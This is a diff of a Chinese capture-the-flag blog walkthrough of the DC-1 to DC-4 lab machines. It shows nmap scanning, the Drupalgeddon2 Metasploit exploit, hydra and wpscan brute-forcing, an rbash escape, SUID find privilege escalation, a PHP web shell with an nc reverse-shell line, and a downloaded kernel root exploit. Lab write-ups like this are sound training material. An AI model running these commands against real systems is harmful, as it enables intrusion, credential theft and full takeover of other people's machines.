@@ -86,13 +86,13 @@ DC-1环境虚拟机平台：VMware Workstation Pro
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    41k
+                    42k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    37 mins.
+                    38 mins.
                 </span>
                 
                 
@@ -134,34 +134,42 @@ DC-1环境虚拟机平台：VMware Workstation Pro
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-1.png" alt="1-1"></p>
 <p>由于IP也不知道，所以没有目标下手，所以需要获取靶机的IP地址。Kali上使用<code>Nmap</code>扫描本网段下的所有主机</p>
 <p>先查看Kali所处的网段</p>
-<pre><code>ifconfig
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
+<pre><code class="code">ifconfig
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-2.png" alt="1-2"></p>
 <p>Nmap通过Ping方法扫描网段内所有主机，排除掉其他IP，找到目标靶机（192.168.43.27）</p>
-<pre><code>nmap -sP 192.168.43.0/24
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
+<pre><code class="code">nmap -sP 192.168.43.0/24
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-3.png" alt="1-3"></p>
 <p>扫描主机开放的端口</p>
 <p>Ps：-sV，版本探测。版本探测不是进行端口扫描，而是通过相应的端口对应的服务，根据服务指纹识别出相应的版本</p>
-<pre><code>nmap -sV 192.168.43.27
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
+<pre><code class="code">nmap -sV 192.168.43.27
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-4.png" alt="1-4"></p>
 <p>既然开放了<code>http服务的80端口</code>，那现在就直接用浏览器访问一下</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-5.png" alt="1-5"></p>
 <p>发现是典型的<code>Drupal Site</code>，那就可以启动<code>Metersploit</code>来帮助渗透</p>
-<pre><code>msfconsole
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
+<pre><code class="code">msfconsole
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-6.png" alt="1-6"></p>
 <p>搜索<code>drupal</code>的模块</p>
-<pre><code>search drupal
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
+<pre><code class="msfconsole">search drupal
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-7.png" alt="1-7"></p>
 <p>使用2018-03-28的测试，成功</p>
-<pre><code>use exploit/unix/webapp/drupal_drupalgeddon2
+<pre><code class="msfconsole">use exploit/unix/webapp/drupal_drupalgeddon2
 set rhosts 192.168.43.27
 run
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-8.png" alt="1-8"></p>
 <p>获取<code>shell</code></p>
-<pre><code>shell
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
+<pre><code class="msfconsole">shell
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-9.png" alt="1-9"></p>
 <p>使用<code>Python</code>反弹回一个交互式shell</p>
-<pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
+<pre><code class="code">python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-10.png" alt="1-10"></p>
 <p>在当前目录下（网页根目录<code>/var/www/</code>）发现<code>flag1.txt</code>，查看后给出提示：</p>
 <blockquote>
 <p>Every good CMS needs a config file - and so do you.</p>
@@ -175,21 +183,24 @@ run
 <p>大意应该就是我们能用当前配置文件下的信息做一些什么呢？注意到提示下面有数据库的账号密码，所以我们可以拿着这个去登录数据库</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-12.png" alt="1-12"></p>
 <p>尝试登录数据库，成功</p>
-<pre><code>mysql -u dbuser -p
+<pre><code class="code">mysql -u dbuser -p
 R0ck3t
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-13.png" alt="1-13"></p>
 <p>查看<code>drupal库-users表</code>，发现了admin的账号密码，但是密码经过加密</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-14.png" alt="1-14"></p>
 <p>现在可以选择修改掉admin的密码，但是密码经过特殊算法加密，如果不按照它的加密规则修改，查询的时候还是会不正确，所以就必须按照加密规则加密然后去修改。参考文章：<a href="http://drupalchina.cn/node/2128" target="_blank" rel="noopener">http://drupalchina.cn/node/2128</a></p>
 <p>退出数据库，切换到网站根目录下</p>
-<pre><code>\q
+<pre><code class="code">\q
 cd /var/www
 php scripts/password-hash.sh [123456]
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-15.png" alt="1-15"></p>
 <p>再次进入数据库，将刚才返回的<code>hash值</code>拿去替换为<code>admin</code>的密码</p>
-<pre><code>update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;
+<pre><code class="code">update users set pass=&quot;$S$DpO/2yRe.nB1y8WswwIgYPp/hxooDcHaPXrEW33ERy9o5ox2jLwa&quot; where name=&quot;admin&quot;;
 select * from users;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-16.png" alt="1-16"></p>
 <p>更改完后，现在用户admin的密码就变为123456了，回到网站中尝试登陆，果然成功了</p>
 <p>并且在<code>Dashboard</code>模块找到了<code>flag3</code>，提示：</p>
 <blockquote>
@@ -197,55 +208,66 @@ select * from users;
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-17.png" alt="1-17"></p>
 <p>flag3提示我们<code>提权（PERMS）</code>、<code>FIND命令</code>、<code>-exec</code>。既然涉及到提权，那么下一个flag应该是需要相应的权限才能查看，可以搜索一下flag关键字</p>
-<pre><code>find / -name &quot;flag*&quot;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
+<pre><code class="code">find / -name &quot;flag*&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-18.png" alt="1-18"></p>
 <p>找到了<code>/home/flag4</code>目录下的<code>flag4.txt</code>，查看后给出了提示：</p>
 <blockquote>
 <p>Can you use this same method to find or access the flag in root? Probably. But perhaps it’s not that easy.  Or maybe it is?</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-19.png" alt="1-19"></p>
 <p>提示我们<code>/root</code>下有下一个flag，但是尝试进入时，被拒绝了，只有<code>root</code>能访问</p>
-<pre><code>cd /root
+<pre><code class="code">cd /root
 cd /
 ls -l
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-20.png" alt="1-20"></p>
 <p>现在就需要<code>提权</code>了，根据flag3的提示，本次使用具有<code>SUID</code>的命令来提权，先找一下具有<code>SUID（4000）</code>权限的命令，可以发现find命令就有<code>4000</code>权限</p>
-<pre><code>find / -perm -4000
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
+<pre><code class="code">find / -perm -4000
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-21.png" alt="1-21"></p>
 <p>现在就可以利用<code>find命令</code>来提权，直接获得<code>root</code>权限</p>
-<pre><code>cd /var/www
+<pre><code class="code">cd /var/www
 touch ti_quan
 find / -name ti_quan -exec &quot;whoami&quot; \;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-22.png" alt="1-22"></p>
 <p>弹出root权限的shell，查看<code>/root</code>下的flag了</p>
 <p>Ps：注意此处<code>&quot;/bin/sh&quot;</code>才会是<code>root</code>权限，如果换成<code>&quot;/bin/bash&quot;</code>就还会是<code>www-data</code>权限</p>
-<pre><code>find / -name ti_quan -exec &quot;/bin/sh&quot; \;
+<pre><code class="code">find / -name ti_quan -exec &quot;/bin/sh&quot; \;
 cd \root
 cat thefinalflag.txt
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-23.png" alt="1-23"></p>
 <p>看了参考的文章，知道本靶机还有一个玩法，就是用<code>hydra</code>去爆破flag4用户的密码，先介绍参数：</p>
-<pre><code>-l [指定用户名]
+<pre><code class="code">-l [指定用户名]
 -P [加载自定义的密码字典]
 ssh://[ip] 指定使用的协议和IP
-</code></pre><p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
-<pre><code>hydra -l flag4 -P password.txt ssh://192.168.43.27
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
+</code></pre>
+<p>先自己创建<code>password.txt</code>，然后使用hydra（由于我换了网络，所以IP改一下）</p>
+<pre><code class="code">hydra -l flag4 -P password.txt ssh://192.168.43.27
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-24.png" alt="1-24"></p>
 <p>爆破出密码为<code>orange</code>，用ssh去连接登录</p>
-<pre><code>ssh flag4@192.168.43.27
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
+<pre><code class="code">ssh flag4@192.168.43.27
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/1-25.png" alt="1-25"></p>
 <h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84或192.168.2.107）</p>
 <p>靶机：DC-2（IP：192.168.43.10或192.168.2.109）</p>
 <h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>打开DC2靶机之后，照样利用<code>Nmap</code>扫描攻击机的网段，找到DC2的IP地址之后，扫描DC2的端口开放情况</p>
-<pre><code>nmap -sP 192.168.43.0/24
+<pre><code class="code">nmap -sP 192.168.43.0/24
 nmap -sV 192.168.43.10
-</code></pre><p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
-<pre><code>nmap -A 192.168.43.10
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
+</code></pre>
+<p>扫描结果显示开放80端口，但是访问时却访问不了，用<code>-A</code>选项扫一下</p>
+<pre><code class="code">nmap -A 192.168.43.10
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-12.png" alt="2-12"></p>
 <p>修改hosts文件</p>
-<pre><code>vi /etc/hosts
+<pre><code class="code">vi /etc/hosts
 cat /etc/hosts
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-13.png" alt="2-13"></p>
 <p>再次浏览器访问，发现是<code>WordPress</code>的站，并且发现<code>flag1</code>，提示：</p>
 <blockquote>
 <p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
@@ -257,23 +279,27 @@ cat /etc/hosts
 <p>根据提示的内容，应该是要我们去获取后台的用户和密码</p>
 <p>首先，用Kali内的工具<code>wpscan（WordPress漏洞扫描器）</code>获取用户名</p>
 <p>Ps：<code>-e u</code>作用是枚举用户</p>
-<pre><code>wpscan --url http://dc-2/ -e u
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
+<pre><code class="code">wpscan --url http://dc-2/ -e u
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-2.png" alt="2-2"></p>
 <p>从扫描结果可以看出来，一共扫描出三个用户：<code>admin</code>、<code>jerry</code>、<code>tom</code>。创建文本<code>dc2_users.txt</code>，将三个用户写入其中</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-3.png" alt="2-3"></p>
 <p>接下来，使用Kali内的工具<code>cewl</code>扫描网站，获取可能的密码</p>
 <p>Ps：<code>-w</code>参数用来将扫描结果输出到文件内</p>
-<pre><code>cewl http://dc-2/ -w dc2_passwords.txt
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
+<pre><code class="code">cewl http://dc-2/ -w dc2_passwords.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-4.png" alt="2-4"></p>
 <p>现在有了用户名和密码，可以利用刚才生成的<code>dc2_users.txt</code>和<code>dc2_passwords.txt</code>去爆破。有两种方法：1.wpscan 2.hydra</p>
 <p>方法一：wpscan</p>
-<pre><code>wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
+<pre><code class="code">wpscan --url http://dc-2/ -U dc2_users -P dc2_passwords.txt
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-5.png" alt="2-5"></p>
 <p>方法二：hydra</p>
 <p>由于hydra不行wpscan是专门针对WordPress的漏洞扫描工具，所以需要提供登录的页面<code>（wp-login.php）</code>、提交表单的方式<code>（POST）</code>以及表单的数据<code>（log、pwd等等）</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-6.png" alt="2-6"></p>
-<pre><code>hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
+<pre><code class="code">hydra -L dc2_users.txt -P dc2_passwords.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-7.png" alt="2-7"></p>
 <p>现在得到了<code>jerry</code>和<code>tom</code>的用户名和密码，登录<code>jerry</code>账户，拿到了<code>flag2</code>，提示：</p>
 <blockquote>
 <p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
@@ -281,20 +307,23 @@ cat /etc/hosts
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-8.png" alt="2-8"></p>
 <p>重新扫描靶机的所有端口，扫到7744端口（raqmon-pdu）</p>
-<pre><code>nmap -p1-65535 192.168.43.10
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
+<pre><code class="code">nmap -p1-65535 192.168.43.10
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png" alt="2-9"></p>
 <p>ssh连接，tom的账号</p>
 <p>Ps：由于这里端口不是22号端口，所以需要指定端口</p>
-<pre><code>ssh tom@192.168.43.10 -p 7744
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
+<pre><code class="code">ssh tom@192.168.43.10 -p 7744
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
 <p>连接成功，但是碰到了<code>rbash (restricited Bash)</code>，许多命令都被禁用了</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png" alt="2-11"></p>
 <p>用vi命令绕过受限的shell</p>
-<pre><code>vi flag3.txt
+<pre><code class="code">vi flag3.txt
 :set shell=/bin/bash
 :shell
 export -p
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
 <pre><code class="bash"># export PATH=$PATH:/bin/
 # export -p
 
@@ -406,7 +435,7 @@ If you enjoyed this CTF, send me a tweet via @DCAU7.
 <h2 id="渗透测试-2"><a href="#渗透测试-2" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现只开启了80端口，浏览器访问</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-1.png" alt="3-1"></p>
 <p>利用前段时间学长给的工具<code>gwhatweb</code>，知道了网站框架是<code>Joomla(逐浪)</code></p>
-<pre><code># python gwhatweb.py http://192.168.43.134/
+<pre><code class="bash"># python gwhatweb.py http://192.168.43.134/
 
 root@Knlvre:~/桌面/gwhatweb-master# python gwhatweb.py http://192.168.43.134/
 webdata total:1421
@@ -417,8 +446,9 @@ CMS:Joomla(逐浪) Judge:http://192.168.43.134/plugins/authentication/joomla/joo
 CMS:Joomla(逐浪) Judge:http://192.168.43.134/modules/mod_banners/mod_banners.xml re:joomla
 CMS:Joomla(逐浪) Judge:http://192.168.43.134/robots.txt.dist re:joomla
 cost: 4.991101 s
-</code></pre><p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
-<pre><code># python joomblah.py http://192.168.43.134/
+</code></pre>
+<p>使用Joomla框架扫描工具<code>Joomblah</code>扫描网站</p>
+<pre><code class="bash"># python joomblah.py http://192.168.43.134/
 
 root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134/
 
@@ -446,8 +476,9 @@ root@Knlvre:~/桌面/exploits/Joomblah# python joomblah.py http://192.168.43.134
   -  Extracting users from users
   -  Extracting sessions from session
 
-</code></pre><p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
-<pre><code># vi hash.txt
+</code></pre>
+<p>得到一串<code>hash</code>密码， 用<code>john</code>工具爆破一下得到密码：snoopy</p>
+<pre><code class="bash"># vi hash.txt
 # 填入$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
 # john hash.txt
 
@@ -464,18 +495,21 @@ snoopy           (?)
 1g 0:00:00:02 DONE 2/3 (2019-09-23 09:06) 0.4830g/s 17.39p/s 17.39c/s 17.39C/s mustang..buster
 Use the &quot;--show&quot; option to display all of the cracked passwords reliably
 Session completed
-</code></pre><p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
-<pre><code>root@Knlvre:~# john hash.txt 
+</code></pre>
+<p>Ps：第一次使用<code>john</code>，当重复爆破一个文件时，会出现以下提示</p>
+<pre><code class="bash">root@Knlvre:~# john hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 No password hashes left to crack (see FAQ)    #提示
-</code></pre><p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
-<pre><code>root@Knlvre:~# john --show hash.txt 
+</code></pre>
+<p>百度之后才知道，john不会再执行爆破过的文件，如果出现如上提示，可以加<code>--show</code>参数查看文件，就能看到破解情况</p>
+<pre><code class="bash">root@Knlvre:~# john --show hash.txt 
 ?:snoopy
 
 1 password hash cracked, 0 left
-</code></pre><p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
-<pre><code>[09:57:08] 200 -    5KB - /administrator/
+</code></pre>
+<p><code>dirsearch</code>扫描出后台<code>/administrator/</code></p>
+<pre><code class="bash">[09:57:08] 200 -    5KB - /administrator/
 [09:57:08] 200 -    5KB - /administrator/index.php
 [09:57:08] 301 -  329B  - /administrator/logs  -&gt;  http://192.168.43.134/administrator/logs/
 [09:57:11] 301 -  314B  - /bin  -&gt;  http://192.168.43.134/bin/
@@ -503,7 +537,8 @@ No password hashes left to crack (see FAQ)    #提示
 [09:57:32] 301 -  314B  - /tmp  -&gt;  http://192.168.43.134/tmp/
 [09:57:32] 200 -   31B  - /tmp/
 [09:57:33] 200 -    2KB - /web.config.txt
-</code></pre><p>访问后，用admin的密码成功登陆</p>
+</code></pre>
+<p>访问后，用admin的密码成功登陆</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-2.png" alt="3-2"></p>
 <p>选择<code>Configuration -&gt; Templates -&gt; Templates -&gt; Protostar Details and Files -&gt; New File</code>，创建<code>shell.php</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-3.png" alt="3-3"></p>
@@ -514,37 +549,43 @@ system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-4.png" alt="3-4"></p>
 <p>写完保存之后，我们先用<code>nc</code>监听<code>3737</code>端口</p>
-<pre><code>root@Knlvre:~# nc -lvp 3737
+<pre><code class="bash">root@Knlvre:~# nc -lvp 3737
 listening on [any] 3737 ...
-</code></pre><p>然后访问<code>shell.php</code></p>
-<pre><code>http://192.168.43.134/templates/protostar/shell.php
-</code></pre><p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
-<pre><code>root@Knlvre:~# nc -lvp 3737
+</code></pre>
+<p>然后访问<code>shell.php</code></p>
+<pre><code class="url">http://192.168.43.134/templates/protostar/shell.php
+</code></pre>
+<p>在查看终端时，就拿到了shell，但是该用户并没有什么权限，无法切换到<code>~</code>目录下，准备提权</p>
+<pre><code class="bash">root@Knlvre:~# nc -lvp 3737
 listening on [any] 3737 ...
 connect to [192.168.43.84] from DC3VM [192.168.43.134] 44292
 /bin/sh: 0: can&#39;t access tty; job control turned off
 $ whoami
 www-data
-</code></pre><p>查看版本</p>
-<pre><code>$ lsb_release -a
+</code></pre>
+<p>查看版本</p>
+<pre><code class="bash">$ lsb_release -a
 No LSB modules are available.
 Distributor ID:    Ubuntu
 Description:    Ubuntu 16.04 LTS
 Release:    16.04
 Codename:    xenial
-</code></pre><p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
-<pre><code>searchsploit Ubuntu 16.04
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
+</code></pre>
+<p>使用<code>searchsploit</code>查看关键字<code>Ubuntu和16.04</code>的漏洞</p>
+<pre><code class="code">searchsploit Ubuntu 16.04
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/3-5.png" alt="3-5"></p>
 <p>使用<code>exploits/linux/local/39772.txt</code>，通过<code>-m</code>参数复制到当前目录下</p>
-<pre><code>root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt
+<pre><code class="bash">root@Knlvre:~# searchsploit -m exploits/linux/local/39772.txt
   Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation
       URL: https://www.exploit-db.com/exploits/39772
      Path: /usr/share/exploitdb/exploits/linux/local/39772.txt
 File Type: C source, ASCII text, with CRLF line terminators
 
 Copied to: /root/39772.txt
-</code></pre><p>查看<code>39772.txt</code>可以看到介绍用法</p>
-<pre><code>root@Knlvre:~# tail -20 39772.txt 
+</code></pre>
+<p>查看<code>39772.txt</code>可以看到介绍用法</p>
+<pre><code class="bash">root@Knlvre:~# tail -20 39772.txt 
 
 An exploit that puts all this together is in exploit.tar. Usage:
 
@@ -565,8 +606,9 @@ Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=
 
 Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
 Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
-</code></pre><p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
-<pre><code>$ pwd
+</code></pre>
+<p>注意到上面的这个<code>Exploit-DB Mirror</code>，下载这个<code>zip</code>文件到靶机上</p>
+<pre><code class="bash">$ pwd
 /var/www/html/templates/protostar
 $ ls
 component.php
@@ -640,8 +682,9 @@ suid file detected, launching rootshell...
 we have root privs now...
 id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
-</code></pre><p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
-<pre><code>cd ~
+</code></pre>
+<p>执行<code>compile.sh</code>的过程中好像报错了，但是不要紧，还是生成了<code>doubleput</code>，执行后拿到了<code>root</code>权限，拿到了flag</p>
+<pre><code class="bash">cd ~
 ls
 the-flag.txt
 cat the-flag.txt
@@ -662,11 +705,12 @@ please let me know.
 As per usual, comments and complaints can be sent via Twitter to @DCAU7
 
 Have a great day!!!!
-</code></pre><h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
+</code></pre>
+<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
 <p>攻击机：Kali（IP：192.168.43.84）</p>
 <p>靶机：DC-4（IP：192.168.43.193）</p>
 <h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描靶机，发现开启了<code>22</code>和<code>80</code>端口</p>
-<pre><code>root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193
+<pre><code class="bash">root@Knlvre:~# nmap -p1-65535 -A 192.168.43.193
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-23 14:20 CST
 Nmap scan report for dc-4 (192.168.43.193)
 Host is up (0.00069s latency).
@@ -694,7 +738,8 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
-</code></pre><p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
+</code></pre>
+<p>访问80端口，是一个登录页面，没有次数、验证码之类的限制</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/4-1.png" alt="4-1"></p>
 <p>查看源码，<code>hydra</code>爆破</p>
 <pre><code class="html">&lt;!DOCTYPE html&gt;
@@ -721,7 +766,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.91 seconds
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
-<pre><code>root@Knlvre:/usr/share/wordlists# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.193 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;
